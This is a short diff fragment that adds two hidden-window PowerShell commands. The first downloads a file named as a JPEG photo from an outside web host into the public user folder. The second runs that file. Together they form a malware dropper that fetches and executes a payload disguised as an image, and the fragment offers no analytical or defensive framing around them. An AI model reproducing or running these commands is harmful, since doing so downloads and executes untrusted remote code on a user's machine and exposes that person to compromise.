@@ -1,0 +1,2 @@
+powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://term-owenr.co/d/photo_2024-05-15_23-33-24.jpg', 'C:\Users\Public\anhsp.jpg')"
+powershell.exe -WindowStyle Hidden -Command " C:\Users\Public\anhsp.jpg"
